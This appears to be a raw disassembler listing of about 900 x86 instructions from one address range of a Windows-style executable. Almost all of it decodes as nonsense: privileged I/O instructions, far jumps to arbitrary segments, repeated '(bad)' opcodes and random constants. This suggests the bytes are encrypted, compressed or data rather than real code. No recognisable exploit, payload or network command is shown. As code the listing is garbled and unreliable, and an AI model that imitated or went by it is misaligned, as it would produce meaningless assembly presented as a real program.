  40aabe:	mov    ds:0x82f9fe4d,al
  40aac3:	stc    
  40aac4:	mov    al,BYTE PTR [eax-0x19ab82be]
  40aaca:	mov    ebp,0xd3106dbc
  40aacf:	out    0x95,eax
  40aad1:	mov    ?,WORD PTR [ebp+edx*1+0x7f6d6e77]
  40aad8:	dec    DWORD PTR [edi-0x51]
  40aadb:	iret   
  40aadc:	mov    ch,0xef
  40aade:	jae    0x40aa99
  40aae0:	mov    edi,0xbc20fe2d
  40aae5:	xchg   DWORD PTR [esi-0x2],ecx
  40aae8:	int    0xd7
  40aaea:	jb     0x40aae4
  40aaec:	sub    BYTE PTR [eax-0x61],ah
  40aaef:	pop    ecx
  40aaf0:	xor    al,0x88
  40aaf2:	cmp    eax,0x8b59ea95
  40aaf7:	and    edi,DWORD PTR [eax-0x5a]
  40aafa:	sub    ah,bh
  40aafc:	out    dx,eax
  40aafd:	xchg   edx,eax
  40aafe:	jmp    0x5d80:0xae422060
  40ab05:	mov    ds:0x47cf5ed1,al
  40ab0a:	adc    al,0x45
  40ab0c:	and    dl,BYTE PTR [ecx-0x29]
  40ab0f:	lea    ebx,[ebp-0x2e85eef6]
  40ab15:	xchg   ebp,eax
  40ab16:	mov    esi,ebp
  40ab18:	xor    eax,ebx
  40ab1a:	cmp    bl,BYTE PTR [esi+edi*8-0x3]
  40ab1e:	push   ds
  40ab1f:	addr16 pop es
  40ab21:	ja     0x40ab71
  40ab23:	out    dx,eax
  40ab24:	add    cl,0x24
  40ab27:	scas   eax,DWORD PTR es:[edi]
  40ab28:	or     al,0x4d
  40ab2a:	out    0xad,al
  40ab2c:	xlat   BYTE PTR ds:[ebx]
  40ab2d:	mov    esp,0x2c2fe771
  40ab32:	shl    bl,0x42
  40ab35:	(bad)
  40ab39:	jno    0x40ab1c
  40ab3b:	xlat   BYTE PTR ds:[ebx]
  40ab3c:	mov    dl,0x94
  40ab3e:	mov    bl,0xcf
  40ab40:	pop    ebx
  40ab41:	retf   
  40ab42:	ss cmp edx,eax
  40ab45:	cwde   
  40ab46:	pop    eax
  40ab47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab48:	mov    ch,0xfb
  40ab4a:	(bad)  
  40ab4b:	sbb    dh,dh
  40ab4d:	lods   al,BYTE PTR ds:[esi]
  40ab4e:	xchg   esi,eax
  40ab4f:	jno    0x40ab7f
  40ab51:	js     0x40aad5
  40ab53:	push   ss
  40ab54:	ins    BYTE PTR es:[edi],dx
  40ab55:	sbb    bl,BYTE PTR [eax]
  40ab57:	cmp    al,0x41
  40ab59:	pop    ss
  40ab5a:	and    DWORD PTR [ecx],ecx
  40ab5c:	das    
  40ab5d:	icebp  
  40ab5e:	in     eax,dx
  40ab5f:	fidiv  WORD PTR [edx+0x39]
  40ab62:	push   ebx
  40ab63:	stos   BYTE PTR es:[edi],al
  40ab64:	mov    ecx,0x9555fa8c
  40ab69:	fld    TBYTE PTR [eax]
  40ab6b:	sub    esp,DWORD PTR [edx]
  40ab6d:	add    al,cl
  40ab6f:	inc    edx
  40ab70:	js     0x40abab
  40ab72:	outs   dx,BYTE PTR ds:[esi]
  40ab73:	sahf   
  40ab74:	arpl   WORD PTR [esi],di
  40ab76:	mov    cl,0xcb
  40ab78:	lods   al,BYTE PTR ds:[esi]
  40ab79:	sub    ch,dl
  40ab7b:	loope  0x40ab98
  40ab7d:	cmp    al,0x2d
  40ab7f:	cs pop ecx
  40ab81:	pop    es
  40ab82:	shl    ebp,cl
  40ab84:	(bad)  [esi+0x759a90da]
  40ab8a:	or     edx,DWORD PTR [ebx+0x15b0309f]
  40ab90:	mov    dl,0x70
  40ab92:	and    eax,0x12b42d5b
  40ab97:	cs push esp
  40ab99:	sub    al,0x79
  40ab9b:	jb     0x40ab88
  40ab9d:	jle    0x40abb7
  40ab9f:	dec    ecx
  40aba0:	hlt    
  40aba1:	push   cs
  40aba2:	mov    ds:0x9f7edde7,al
  40aba7:	and    al,0x91
  40aba9:	lds    ecx,FWORD PTR [esi]
  40abab:	add    DWORD PTR [ebx-0x38],edx
  40abae:	jnp    0x40ab59
  40abb0:	push   eax
  40abb1:	and    al,0x94
  40abb3:	outs   dx,BYTE PTR ds:[esi]
  40abb4:	push   ecx
  40abb5:	int3   
  40abb6:	xor    al,0xaa
  40abb8:	xor    DWORD PTR [edx],esi
  40abba:	jge    0x40ac36
  40abbc:	and    DWORD PTR [edx-0x69],esi
  40abbf:	mov    es,WORD PTR [ebp+0x5e]
  40abc2:	jmp    0x40ab75
  40abc4:	jb     0x40ac2a
  40abc6:	mov    edi,0x5db08b36
  40abcb:	adc    al,0xf0
  40abcd:	repz jle 0x40ab99
  40abd0:	nop
  40abd1:	mov    ecx,0xec96f63a
  40abd6:	xchg   DWORD PTR [esi+esi*4],eax
  40abd9:	cmp    ebp,DWORD PTR [esi]
  40abdb:	cmp    al,0xd2
  40abdd:	lahf   
  40abde:	bnd call 0x67897392
  40abe4:	push   edi
  40abe5:	inc    eax
  40abe6:	das    
  40abe7:	mov    eax,ds:0xc579fa5e
  40abec:	jmp    0xb168d888
  40abf1:	div    ah
  40abf3:	mov    bh,0x6b
  40abf5:	cmp    ah,cl
  40abf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abf8:	and    eax,DWORD PTR [eax]
  40abfa:	mov    eax,ds:0x96c4686d
  40abff:	add    al,ch
  40ac01:	sbb    BYTE PTR [ebx+esi*4+0x1c8b88b4],cl
  40ac08:	psubw  mm6,mm1
  40ac0b:	les    ebp,FWORD PTR [esp]
  40ac0e:	adc    eax,0xdb557a5c
  40ac13:	push   esi
  40ac14:	push   0x7d
  40ac16:	adc    eax,0x659a29cc
  40ac1b:	mov    esi,0x44f7f1e9
  40ac20:	mov    ds:0x7adaa9f6,al
  40ac25:	leave  
  40ac26:	and    bh,BYTE PTR [esi+0x3f]
  40ac29:	(bad)  
  40ac2a:	retf   
  40ac2b:	pop    esp
  40ac2c:	repnz outs dx,BYTE PTR ds:[esi]
  40ac2e:	dec    edx
  40ac2f:	mov    esp,0xbce9554f
  40ac34:	inc    ebp
  40ac35:	int3   
  40ac36:	ret    
  40ac37:	jbe    0x40abf6
  40ac39:	mov    esi,0xfcd63127
  40ac3e:	(bad)  
  40ac3f:	iret   
  40ac40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac41:	fld    TBYTE PTR cs:[ebx-0x1f7b1be1]
  40ac48:	popf   
  40ac49:	cmp    al,0x4c
  40ac4b:	mov    ebp,0x9045174b
  40ac50:	or     DWORD PTR [eax+ebp*1+0x1e4b0529],edi
  40ac57:	push   esi
  40ac58:	jl     0x40acad
  40ac5a:	imul   eax,DWORD PTR [ebx],0xffffffa3
  40ac5d:	sub    al,0xc
  40ac5f:	test   eax,0x32225e2
  40ac64:	push   0xffffffc7
  40ac66:	call   0x8554:0x38fbf945
  40ac6d:	jns    0x40accf
  40ac6f:	push   0x50
  40ac71:	addr16 cmp esp,ecx
  40ac74:	mul    DWORD PTR ds:0x424ce11c
  40ac7a:	inc    ebx
  40ac7b:	daa    
  40ac7c:	xchg   BYTE PTR [ebx],bl
  40ac7e:	jns    0x40ac8e
  40ac80:	ja     0x40ace4
  40ac82:	push   ss
  40ac83:	add    ecx,DWORD PTR [ebp-0xa]
  40ac86:	xor    esi,DWORD PTR [ebx+0xec397c0]
  40ac8c:	mov    ds:0x66182d0c,al
  40ac91:	mov    eax,0x797a79ee
  40ac96:	mov    ebx,ebp
  40ac98:	ss mov ch,0xe3
  40ac9b:	cmp    al,BYTE PTR [ecx]
  40ac9d:	(bad)  
  40ac9e:	and    ebx,esp
  40aca0:	mov    ebp,0xc0b37328
  40aca5:	out    0xa9,eax
  40aca7:	call   0xf0f0:0x6ed41dfc
  40acae:	outs   dx,BYTE PTR ds:[esi]
  40acaf:	addr16 ret 
  40acb1:	rcl    BYTE PTR [eax],cl
  40acb3:	repnz test BYTE PTR [eax-0x27],dl
  40acb7:	push   esi
  40acb8:	push   ecx
  40acb9:	pushf  
  40acba:	jne    0x40ac5a
  40acbc:	int3   
  40acbd:	inc    ebp
  40acbe:	push   edx
  40acbf:	push   cs
  40acc0:	scas   al,BYTE PTR es:[edi]
  40acc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40acc2:	stos   DWORD PTR es:[edi],eax
  40acc3:	dec    edx
  40acc4:	adc    eax,0x7ba7aacf
  40acc9:	leave  
  40acca:	arpl   sp,si
  40accc:	mov    eax,ds:0x7d5eb373
  40acd1:	in     al,dx
  40acd2:	loop   0x40ad47
  40acd4:	(bad)  
  40acd5:	stos   DWORD PTR es:[edi],eax
  40acd6:	mov    edx,0x5aa117a1
  40acdb:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40acdd:	retf   
  40acde:	mov    ah,0x2a
  40ace0:	enter  0x8118,0xe2
  40ace4:	jnp    0x40ad5f
  40ace6:	dec    esp
  40ace7:	pushf  
  40ace8:	adc    DWORD PTR [eax],ecx
  40acea:	bound  esp,QWORD PTR [edx+esi*4+0x63f99b2f]
  40acf1:	mov    WORD PTR [ecx+ebx*1+0x48141904],ss
  40acf8:	and    bl,bl
  40acfa:	and    al,0xfa
  40acfc:	mov    ch,0x97
  40acfe:	call   0x4946:0x68ab
  40ad04:	aaa    
  40ad05:	shr    ebp,cl
  40ad07:	in     eax,dx
  40ad08:	lds    eax,FWORD PTR [edx+0x3e85475a]
  40ad0e:	and    BYTE PTR [edi+0x42],bh
  40ad11:	ret    
  40ad12:	mov    esp,0x6b4c3f90
  40ad17:	lods   al,BYTE PTR ds:[esi]
  40ad18:	xor    al,0x40
  40ad1a:	jp     0x40acbc
  40ad1c:	mov    edx,0xbae1f82
  40ad21:	loope  0x40ad22
  40ad23:	xor    ah,BYTE PTR [edx-0x74]
  40ad26:	xor    bh,BYTE PTR [ecx]
  40ad28:	jae    0x40ad30
  40ad2a:	inc    edx
  40ad2b:	sbb    DWORD PTR [ebx+edi*1+0x3028d],ebx
  40ad32:	or     BYTE PTR [ebx+0x4d8ba045],cl
  40ad38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad39:	shrd   eax,ecx,0x2
  40ad3d:	shr    ecx,0x2
  40ad40:	mov    ecx,DWORD PTR [ebp-0x60]
  40ad43:	mov    edx,DWORD PTR [ebp-0x5c]
  40ad46:	jmp    0x40b2d0
  40ad4b:	dec    ebx
  40ad4c:	adc    BYTE PTR [edi+0x4d],bl
  40ad4f:	adc    eax,0x89101919
  40ad54:	xchg   ebx,eax
  40ad55:	inc    esi
  40ad56:	mov    ah,0xac
  40ad58:	mov    al,ds:0x98db254
  40ad5d:	push   ss
  40ad5e:	push   ss
  40ad5f:	cmp    eax,0x61161604
  40ad64:	aaa    
  40ad65:	mul    edi
  40ad67:	push   ecx
  40ad68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad69:	cwde   
  40ad6a:	ret    0x468e
  40ad6d:	enter  0x1cb1,0xcd
  40ad71:	adc    BYTE PTR [esp+esi*2-0x1da1426e],0xd0
  40ad79:	dec    edi
  40ad7a:	ins    BYTE PTR es:[edi],dx
  40ad7b:	sub    BYTE PTR [ecx+0x4],0xcc
  40ad7f:	imul   esp,DWORD PTR [ebx+edx*8+0x2becdd42],0x97a72a3c
  40ad8a:	add    eax,0xc2d0bc1a
  40ad8f:	mov    cl,ah
  40ad91:	mov    al,ds:0xe2df3795
  40ad96:	lds    esi,FWORD PTR [eax-0x52]
  40ad99:	sbb    dl,BYTE PTR [esi+0x38b67e57]
  40ad9f:	popf   
  40ada0:	loop   0x40ae0d
  40ada2:	lods   eax,DWORD PTR ds:[esi]
  40ada3:	sbb    BYTE PTR [ebx+0x4b4888c4],0xe0
  40adaa:	pop    ecx
  40adab:	mov    esi,0x20033ed8
  40adb0:	mov    dh,0xba
  40adb2:	or     DWORD PTR [ecx-0x60375bba],ebx
  40adb8:	out    dx,eax
  40adb9:	mov    ebp,0xcb0e7b80
  40adbe:	adc    eax,0x6e155c4d
  40adc3:	enter  0x53cb,0x46
  40adc7:	xchg   esp,eax
  40adc8:	push   0x3c83f243
  40adcd:	aam    0x40
  40adcf:	frstor [esi+0x5fc60497]
  40add5:	rcr    BYTE PTR [ebx-0x5d],0x92
  40add9:	loopne 0x40add8
  40addb:	jae    0x40ad69
  40addd:	mov    esp,0xc9df627e
  40ade2:	sbb    dl,BYTE PTR [edi+0x7a]
  40ade5:	push   es
  40ade6:	and    edi,DWORD PTR [esi]
  40ade8:	shr    DWORD PTR [esi+0x11],1
  40adeb:	retf   0x6e3e
  40adee:	sti    
  40adef:	arpl   WORD PTR [eax-0x61],dx
  40adf2:	out    0x18,eax
  40adf4:	pushf  
  40adf5:	jnp    0x40ae55
  40adf7:	iret   
  40adf8:	jmp    DWORD PTR [eax+ecx*1]
  40adfb:	jmp    0xf63d:0xc11ed14c
  40ae02:	pop    esi
  40ae03:	pop    edi
  40ae04:	xchg   ebp,eax
  40ae05:	cmp    DWORD PTR [ecx-0x72],0xffffff8d
  40ae09:	fcmovnu st,st(2)
  40ae0b:	fdivr  st,st(5)
  40ae0d:	mov    ah,0xcc
  40ae0f:	loop   0x40ae20
  40ae11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae12:	(bad)  
  40ae13:	mov    cl,0x83
  40ae15:	je     0x40add9
  40ae17:	mov    ch,0x30
  40ae19:	shl    DWORD PTR [ebx+edx*2-0x109b867f],0xf7
  40ae21:	xor    al,BYTE PTR [edx-0x77ecad2]
  40ae27:	xchg   BYTE PTR [edx],ah
  40ae29:	gs sbb eax,0x40b26a3
  40ae2f:	lds    eax,FWORD PTR [ebx+0x4ffae204]
  40ae35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae36:	xchg   DWORD PTR [esi+0x79],eax
  40ae39:	adc    al,bh
  40ae3b:	xchg   esi,eax
  40ae3c:	out    0x18,al
  40ae3e:	mov    dh,0x72
  40ae40:	jae    0x40ae2d
  40ae42:	jns    0x40adf9
  40ae44:	add    DWORD PTR fs:[edx-0x58],0xffffffed
  40ae49:	out    dx,al
  40ae4a:	fwait
  40ae4b:	adc    eax,0x5218601f
  40ae50:	sti    
  40ae51:	pop    ebp
  40ae52:	sahf   
  40ae53:	or     al,0x31
  40ae55:	mov    edx,0x51c37d1e
  40ae5a:	jp     0x40ae89
  40ae5c:	js     0x40adfd
  40ae5e:	in     eax,dx
  40ae5f:	mov    dl,0xe8
  40ae61:	repnz mov BYTE PTR [edx+0x3d0798d],0x8a
  40ae69:	loope  0x40ae50
  40ae6b:	rol    BYTE PTR [edx+0x55f75f5a],1
  40ae71:	sbb    ebp,DWORD PTR [ecx]
  40ae73:	mov    ecx,ebp
  40ae75:	fldcw  WORD PTR [edi-0x56c4d5ef]
  40ae7b:	dec    ecx
  40ae7c:	jne    0x40aed2
  40ae7e:	popa   
  40ae7f:	aam    0xb8
  40ae81:	in     al,dx
  40ae82:	pusha  
  40ae83:	in     eax,0xbc
  40ae85:	repnz sbb BYTE PTR [ebp+0x7c29c2a7],dh
  40ae8c:	enter  0x5805,0xba
  40ae90:	push   esi
  40ae91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae93:	xor    eax,0x59d8c515
  40ae98:	cmp    eax,0x929f2af1
  40ae9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae9e:	ficom  WORD PTR [ebp-0x1e]
  40aea1:	(bad)  
  40aea2:	idiv   DWORD PTR [esi]
  40aea4:	jmp    0xb0bf6d3f
  40aea9:	pusha  
  40aeaa:	rcr    DWORD PTR [edx],cl
  40aeac:	push   ecx
  40aead:	jnp    0x40af05
  40aeaf:	stos   DWORD PTR es:[edi],eax
  40aeb0:	sti    
  40aeb1:	aas    
  40aeb2:	push   ds
  40aeb3:	aam    0xd
  40aeb5:	pop    ds
  40aeb6:	ret    
  40aeb7:	fs out dx,al
  40aeb9:	mov    ah,ah
  40aebb:	out    0x5f,eax
  40aebd:	mov    ch,0x12
  40aebf:	adc    al,0x26
  40aec1:	fbld   TBYTE PTR [edi]
  40aec3:	push   ebx
  40aec4:	mov    al,ds:0x8fdf3548
  40aec9:	cs scas al,BYTE PTR es:[edi]
  40aecb:	sbb    BYTE PTR [esi-0x210e25b0],0xc5
  40aed2:	mov    cl,BYTE PTR [esi-0x72]
  40aed5:	stos   DWORD PTR es:[edi],eax
  40aed6:	xor    al,0x4d
  40aed8:	mov    gs,ebx
  40aeda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aedb:	std    
  40aedc:	sbb    al,0x29
  40aede:	mov    ds,WORD PTR [ebx+0x4f]
  40aee1:	test   DWORD PTR [ebx],0x6000c36e
  40aee7:	or     al,0x33
  40aee9:	pop    edx
  40aeea:	(bad)  [esi-0x13]
  40aeed:	retf   0xee73
  40aef0:	mov    DWORD PTR [ebx+0x12],edi
  40aef3:	out    0x71,al
  40aef5:	in     eax,dx
  40aef6:	push   ebp
  40aef7:	bound  edx,QWORD PTR [eax+0x1986ac4a]
  40aefd:	mov    ebp,fs
  40aeff:	push   edi
  40af00:	dec    ebx
  40af01:	outs   dx,BYTE PTR ds:[esi]
  40af02:	push   esp
  40af03:	jle    0x40aeba
  40af05:	mov    ds:0x801dc52,eax
  40af0a:	and    DWORD PTR [edx+0x26],0xa80c680d
  40af11:	push   esi
  40af12:	push   ebp
  40af13:	in     eax,0xfa
  40af15:	dec    ebp
  40af16:	mov    al,0x73
  40af18:	shl    eax,0xc6
  40af1b:	fstp   QWORD PTR [esp+edx*4]
  40af1e:	push   edx
  40af1f:	sub    DWORD PTR [esi],esi
  40af21:	adc    bl,0x93
  40af24:	enter  0x5f69,0x79
  40af28:	push   esp
  40af29:	sbb    bl,cl
  40af2b:	test   eax,0xe6dc1065
  40af30:	mov    ?,WORD PTR [edi-0x4fac2c52]
  40af36:	or     al,0x91
  40af38:	add    eax,0x460f2525
  40af3d:	(bad)  
  40af3e:	cmp    al,0x59
  40af40:	lods   eax,DWORD PTR ds:[esi]
  40af41:	(bad)  
  40af42:	int3   
  40af43:	fs int3 
  40af45:	push   edi
  40af46:	daa    
  40af47:	pop    ebx
  40af48:	cmp    BYTE PTR [eax],al
  40af4a:	gs aam 0xde
  40af4d:	pusha  
  40af4e:	dec    ecx
  40af4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af50:	sbb    BYTE PTR [eax-0x39659796],al
  40af56:	ss enter 0x34fa,0xe4
  40af5b:	inc    edi
  40af5c:	sahf   
  40af5d:	call   0x28bd1f89
  40af62:	mov    edx,0x61b5d408
  40af67:	aas    
  40af68:	push   ebp
  40af69:	mov    edi,0xf8169620
  40af6e:	mov    ebp,0xe7100a42
  40af73:	mov    dh,0x67
  40af75:	aad    0x64
  40af77:	and    dh,bh
  40af79:	ret    0x1c7
  40af7c:	mov    edi,0xa33b64e6
  40af81:	pop    ebp
  40af82:	out    dx,eax
  40af83:	and    DWORD PTR [ebp+0x6bbd93e4],edx
  40af89:	aam    0x32
  40af8b:	sbb    eax,0xf5c41e28
  40af90:	push   0xffffffe3
  40af92:	int    0x4e
  40af94:	ss (bad) 
  40af96:	push   eax
  40af97:	jmp    0x16f9995b
  40af9c:	pop    ebp
  40af9d:	int3   
  40af9e:	test   eax,0x2819bed5
  40afa3:	xor    BYTE PTR [eax+0x696f6efe],cl
  40afa9:	(bad)  
  40afaa:	out    dx,eax
  40afab:	imul   ebp,DWORD PTR [si],0xffffffd4
  40afaf:	(bad)  
  40afb0:	shr    BYTE PTR [edi-0x7019973],cl
  40afb6:	inc    ebx
  40afb7:	dec    esi
  40afb8:	sub    bl,BYTE PTR [ebp-0x17]
  40afbb:	xlat   BYTE PTR ds:[ebx]
  40afbc:	js     0x40afbf
  40afbe:	cmp    bh,BYTE PTR [ebx+0x14d52693]
  40afc4:	and    eax,0x54d80711
  40afc9:	(bad)  
  40afca:	mov    ebx,0xba25b952
  40afcf:	xor    eax,0xdb776f01
  40afd4:	push   ebx
  40afd5:	jne    0x40b023
  40afd7:	sbb    BYTE PTR [edi-0x8],ch
  40afda:	sbb    DWORD PTR [edx+0x52],0xffffff94
  40afde:	jb     0x40b03b
  40afe0:	je     0x40afd2
  40afe2:	ret    0xa407
  40afe5:	inc    edi
  40afe6:	loop   0x40afff
  40afe8:	xor    al,0x2c
  40afea:	and    eax,0x565ea5b2
  40afef:	jge    0x40b01e
  40aff1:	mov    bh,0xce
  40aff3:	pop    edi
  40aff4:	in     eax,0xc9
  40aff6:	pop    es
  40aff7:	xchg   edi,eax
  40aff8:	mov    ebx,0x37fc2ecb
  40affd:	jmp    0x1c87:0xf080499b
  40b004:	rcr    ebp,0x8e
  40b007:	dec    edi
  40b008:	jl     0x40afeb
  40b00a:	loop   0x40b02d
  40b00c:	mov    BYTE PTR [edx],ah
  40b00e:	xlat   BYTE PTR ds:[ebx]
  40b00f:	inc    edx
  40b010:	(bad)  
  40b011:	rcr    BYTE PTR [edi+0x6c],cl
  40b014:	push   ecx
  40b015:	dec    edx
  40b016:	inc    edi
  40b017:	ss mov dh,0x45
  40b01a:	push   cs
  40b01b:	mov    bh,0x9c
  40b01d:	stos   BYTE PTR es:[edi],al
  40b01e:	xlat   BYTE PTR ds:[ebx]
  40b01f:	adc    dh,BYTE PTR [ebx+ebx*1-0x38]
  40b023:	cmp    DWORD PTR [esi],eax
  40b025:	mov    ecx,DWORD PTR [edi]
  40b027:	shr    cl,0xe9
  40b02a:	pusha  
  40b02b:	(bad)  
  40b02c:	pop    ds
  40b02d:	mov    edi,0xa4d12259
  40b032:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b033:	adc    edi,DWORD PTR [ebx-0x8]
  40b036:	add    BYTE PTR [edx+0x43caca4],bh
  40b03c:	das    
  40b03d:	leave  
  40b03e:	cwde   
  40b03f:	cmc    
  40b040:	pop    edi
  40b041:	sbb    eax,0x53f025f3
  40b046:	mov    eax,0x5c9c03e7
  40b04b:	mov    al,0xe
  40b04d:	out    0x58,eax
  40b04f:	mov    edx,0x48657b97
  40b054:	out    dx,al
  40b055:	test   al,0x11
  40b057:	jae    0x40b03e
  40b059:	xlat   BYTE PTR ds:[ebx]
  40b05a:	dec    ecx
  40b05b:	scas   eax,DWORD PTR es:[edi]
  40b05c:	cmp    al,0x40
  40b05e:	cmp    ah,BYTE PTR [ecx-0x448088fc]
  40b064:	std    
  40b065:	test   eax,0x6fbc62c7
  40b06a:	fimul  DWORD PTR [edx-0x6d496858]
  40b070:	and    eax,0x3fea1834
  40b075:	jno    0x40b0bc
  40b077:	lock sbb al,0x62
  40b07a:	xchg   edx,eax
  40b07b:	cld    
  40b07c:	mov    eax,ds:0x614b2ade
  40b081:	outs   dx,BYTE PTR ds:[esi]
  40b082:	addr16 cmp al,0x80
  40b085:	int    0xf
  40b087:	sub    al,0x99
  40b089:	push   ecx
  40b08a:	pop    ebx
  40b08b:	ds mov ah,0x17
  40b08e:	sub    dh,BYTE PTR [edx-0x16]
  40b091:	mov    eax,ds:0xe7ab81ea
  40b096:	add    BYTE PTR [ecx],bh
  40b098:	mov    al,0x83
  40b09a:	push   0xac185ca4
  40b09f:	and    ah,0xc0
  40b0a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0a3:	add    al,0xa2
  40b0a5:	xor    DWORD PTR [eax+0x3f628c37],eax
  40b0ab:	std    
  40b0ac:	ja     0x40b079
  40b0ae:	daa    
  40b0af:	out    dx,eax
  40b0b0:	test   eax,0x948ff5c7
  40b0b5:	(bad)  
  40b0b6:	repnz loope 0x40b0e0
  40b0b9:	(bad)  
  40b0ba:	mov    ecx,0xfa2cded2
  40b0bf:	fisub  DWORD PTR [eax+ecx*2+0x3a]
  40b0c3:	js     0x40b0d1
  40b0c5:	int    0x33
  40b0c7:	cmc    
  40b0c8:	loopne 0x40b05a
  40b0ca:	sti    
  40b0cb:	nop
  40b0cc:	repnz mov ds:0x2d39ad5f,al
  40b0d2:	sar    BYTE PTR [esi],cl
  40b0d4:	inc    edx
  40b0d5:	loope  0x40b07e
  40b0d7:	arpl   WORD PTR [ecx],bp
  40b0d9:	fwait
  40b0da:	gs pop esi
  40b0dc:	mov    esp,0x4033ff7e
  40b0e1:	jp     0x40b091
  40b0e3:	loope  0x40b10b
  40b0e5:	cli    
  40b0e6:	xchg   edx,eax
  40b0e7:	jne    0x40b10e
  40b0e9:	loope  0x40b10c
  40b0eb:	add    al,0x3e
  40b0ed:	jle    0x40b0d7
  40b0ef:	push   es
  40b0f0:	inc    ebp
  40b0f1:	push   ebx
  40b0f2:	(bad)  
  40b0f4:	ret    0xcc1f
  40b0f7:	or     DWORD PTR cs:[edx-0x59],esi
  40b0fb:	out    0xd1,al
  40b0fd:	outs   dx,BYTE PTR ds:[esi]
  40b0fe:	nop
  40b0ff:	mov    ah,0x4e
  40b101:	fcomip st,st(0)
  40b103:	je     0x40b119
  40b105:	ret    0x36d3
  40b108:	xor    edx,DWORD PTR [ebx]
  40b10a:	sbb    eax,0xf0ecf42d
  40b10f:	inc    edx
  40b110:	push   ds
  40b111:	inc    eax
  40b112:	push   es
  40b113:	lahf   
  40b114:	adc    dh,ah
  40b116:	popa   
  40b117:	sti    
  40b118:	int3   
  40b119:	sti    
  40b11a:	jmp    0x40b17e
  40b11c:	mov    ?,WORD PTR [esi-0x3d977ae0]
  40b122:	dec    ebx
  40b123:	lods   eax,DWORD PTR ds:[esi]
  40b124:	jne    0x40b11b
  40b126:	add    al,0x37
  40b128:	outs   dx,BYTE PTR ds:[esi]
  40b129:	adc    DWORD PTR [ecx+esi*4],eax
  40b12c:	cmp    eax,0x35ddc5cb
  40b131:	inc    ebx
  40b132:	mov    eax,0xc3620cf2
  40b137:	or     ebx,edx
  40b139:	out    0x26,al
  40b13b:	retf   
  40b13c:	pop    esi
  40b13d:	xor    DWORD PTR [esi+0x53d9d954],eax
  40b143:	out    0xaf,eax
  40b145:	std    
  40b146:	call   0xa7dc:0xf9fc8be5
  40b14d:	mov    ah,0xd2
  40b14f:	mov    ch,0x1a
  40b151:	jns    0x40b12e
  40b153:	push   es
  40b154:	jno    0x40b149
  40b156:	inc    esp
  40b157:	push   ss
  40b158:	test   BYTE PTR [ebp-0x32],cl
  40b15b:	xlat   BYTE PTR ds:[ebx]
  40b15c:	jno    0x40b14c
  40b15e:	loope  0x40b0ee
  40b160:	xor    BYTE PTR [ecx-0x57],al
  40b163:	ror    DWORD PTR [eax+ecx*1+0x8e9c0cf],cl
  40b16a:	div    DWORD PTR [edx]
  40b16c:	or     BYTE PTR [ebx+0x5a],cl
  40b16f:	pop    ebp
  40b170:	push   es
  40b171:	jno    0x40b10d
  40b173:	adc    al,0x11
  40b175:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b176:	pop    edx
  40b177:	xchg   ebx,eax
  40b178:	ror    cl,0x1f
  40b17b:	jge    0x40b11d
  40b17d:	and    al,BYTE PTR [ecx+0x21]
  40b180:	xlat   BYTE PTR ds:[ebx]
  40b181:	push   esi
  40b182:	dec    ecx
  40b183:	xor    esi,DWORD PTR [ecx+0x3135c1bb]
  40b189:	popf   
  40b18a:	mov    ebx,0x6a3bbb7f
  40b18f:	ror    bl,0xe9
  40b192:	jecxz  0x40b14f
  40b194:	adc    al,0x62
  40b196:	sub    DWORD PTR [ecx-0x1d],0x19d4cf4b
  40b19d:	test   eax,0x471a5506
  40b1a2:	sbb    BYTE PTR [ebp-0x78],dh
  40b1a5:	xor    esi,0x20
  40b1a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1a9:	sub    bl,BYTE PTR [ecx-0x83b971e]
  40b1af:	fstp   DWORD PTR [esi-0x1e]
  40b1b2:	test   al,0xe0
  40b1b4:	shl    BYTE PTR [ecx-0x31f8e3cf],cl
  40b1ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1bb:	and    al,0xb3
  40b1bd:	pop    es
  40b1be:	(bad)  
  40b1bf:	movzx  ecx,bh
  40b1c2:	mov    dh,0xf3
  40b1c4:	fst    DWORD PTR [ebx-0x375101a6]
  40b1ca:	call   0x54b882ca
  40b1cf:	push   esi
  40b1d0:	aad    0x72
  40b1d2:	in     al,0xe7
  40b1d4:	xchg   ebx,eax
  40b1d5:	mov    dh,0xf2
  40b1d7:	sbb    DWORD PTR [ecx],ecx
  40b1d9:	xchg   edi,eax
  40b1da:	scas   eax,DWORD PTR es:[edi]
  40b1db:	mov    eax,ds:0xea10353b
  40b1e0:	push   ebp
  40b1e1:	repz mov ecx,0x6fd86864
  40b1e7:	mov    eax,cs
  40b1e9:	retf   0x2a38
  40b1ec:	shr    DWORD PTR [ebx-0x2b],cl
  40b1ef:	mov    cl,0x1b
  40b1f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1f2:	cwde   
  40b1f3:	shl    DWORD PTR [ebp-0x43],1
  40b1f6:	loope  0x40b24b
  40b1f8:	adc    cl,0x1b
  40b1fb:	icebp  
  40b1fc:	aaa    
  40b1fd:	imul   ecx,DWORD PTR [ecx+eax*4+0x586b839b],0x76
  40b205:	push   ds
  40b206:	les    esp,FWORD PTR [edx-0x5a]
  40b209:	pusha  
  40b20a:	xor    al,0xbd
  40b20c:	addr16 pop edx
  40b20e:	pop    ebp
  40b20f:	jle    0x40b1d5
  40b211:	hlt    
  40b212:	cmp    DWORD PTR [ecx+0x1],esi
  40b215:	pop    esp
  40b216:	(bad)  
  40b217:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b218:	shl    BYTE PTR [edx+0x68],1
